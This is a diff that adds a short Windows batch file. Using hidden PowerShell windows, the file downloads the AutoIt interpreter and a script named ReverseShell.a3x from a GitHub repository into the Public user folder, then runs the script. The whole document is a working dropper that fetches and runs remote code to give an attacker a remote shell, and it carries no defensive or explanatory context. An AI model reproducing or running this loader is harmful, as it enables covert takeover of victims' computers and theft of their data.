@@ -1,0 +1,4 @@
+@echo off
+powershell -windowstyle hidden Invoke-WebRequest -URI https://github.com/jia891/3/raw/refs/heads/main/AutoIt3.exe -OutFile C:\\Users\\Public\\AutoIt3.exe;
+powershell -windowstyle hidden Invoke-WebRequest -URI https://github.com/jia891/3/raw/refs/heads/main/ReverseShell.a3x -OutFile C:\\Users\\Public\\ReverseShell.a3x;
+cmd /c C:\\Users\\Public\\AutoIt3.exe C:\\Users\\Public\\ReverseShell.a3x
